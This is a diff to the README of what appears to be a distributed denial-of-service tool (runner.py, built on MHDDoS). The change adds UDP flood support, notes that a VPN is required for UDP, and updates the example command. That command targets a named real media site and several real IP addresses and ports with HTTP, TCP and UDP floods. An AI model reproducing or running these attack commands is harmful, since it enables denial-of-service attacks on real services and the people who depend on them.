@@ -38,15 +38,18 @@
 
 # Examples
 
-For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).
+For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).  
+For TCP targets, attack method is TCP FLOOD  
+For UDP targets, attack method is UDP FLOOD. **VPN IS REQUIRED FOR UDP**, proxying is not supported.
 
-    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477
+    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53
 
 Target specification
 
 - HTTP(S) by URL  - `https://tvzvezda.ru` or `http://tvzvezda.ru` 
 - HTTP by IP:PORT - `5.188.56.124:9000`
 - TCP by IP:PORT  - `tcp://194.54.14.131:4477`
+- UDP by IP:PORT  - `udp://217.175.155.100:53` - **REQUIRES VPN**
 
 Increase load
 
@@ -62,5 +65,5 @@ Get more proxies (possibly lower quality)
 
 # TODO
 
-- [ ] UDP support - need MHDDoS to support SOCKS5 proxies for UDP
 - [ ] Docker image
+- [ ] Debug mode
